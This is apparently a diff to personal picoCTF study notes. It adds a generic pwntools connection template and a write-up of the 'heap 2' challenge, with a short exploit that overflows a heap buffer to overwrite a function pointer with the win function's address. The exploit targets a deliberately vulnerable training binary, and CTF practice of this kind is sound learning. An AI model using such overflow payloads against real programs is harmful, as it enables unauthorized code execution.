@@ -8,6 +8,17 @@
 1. `exiftool file.txt`
     1. Outputs metadata about a file
 
+```python
+from pwn import *
+
+p = remote("server.picoctf.net", 12345)
+
+p.recvuntil(b"wait until im visible")
+p.sendline(b"write something to command line")
+
+print(p.recvall())
+```
+
 ## PicoCTF
 
 ### General Skills
@@ -694,6 +705,36 @@ Solution:
 1. Similar way to heap 0 challenge, first variable in a heap can be edited but the second needs to be changed to `pico`. By giving input that's size more than 32 characters, we can see that the characters 33, 34, ... goes to the second variable.
 2. The second variable can be overwritten but inputting a string of 32 any characters and then "pico" in the end so the "pico" is stored to the second location in the heap
 3. When the second location in heap stores "pico", the program prints the flag with the "print flag" command.
+
+#### heap 2
+- [Link](https://play.picoctf.org/practice/challenge/435)
+- From: PicoCTF 2024
+- Difficulty: Medium
+- Completed: 2024/10/19
+
+Descrition:
+
+Can you handle function pointers? Download the binary [here](https://artifacts.picoctf.net/c_mimas/50/chall). Download the source [here](https://artifacts.picoctf.net/c_mimas/50/chall.c).
+
+Solution:
+
+1. `void check_win() { ((void (*)())*(int*)x)(); }` basically calls function of address stored in `x` and the idea of this challenge is to overwrite `x` with address of `win` function.
+3. `objdump -D chall | grep win` revelas the address of `win` function which is `00000000004011a0`.
+4. Following Python code gets the flag
+
+```python
+from pwn import *
+
+p = remote("mimas.picoctf.net", 54665)
+
+p.sendline(b"2")
+p.recvuntil(b"buffer")
+p.sendline(b"12345678901234567890123456789012\xa0\x11\x40\x00\x00\x00\x00\x00")
+
+p.recvuntil(b"choice")
+p.sendline(b"4")
+print(p.recvall())
+```
 
 #### format string 0
 - [Link](https://play.picoctf.org/practice/challenge/433)
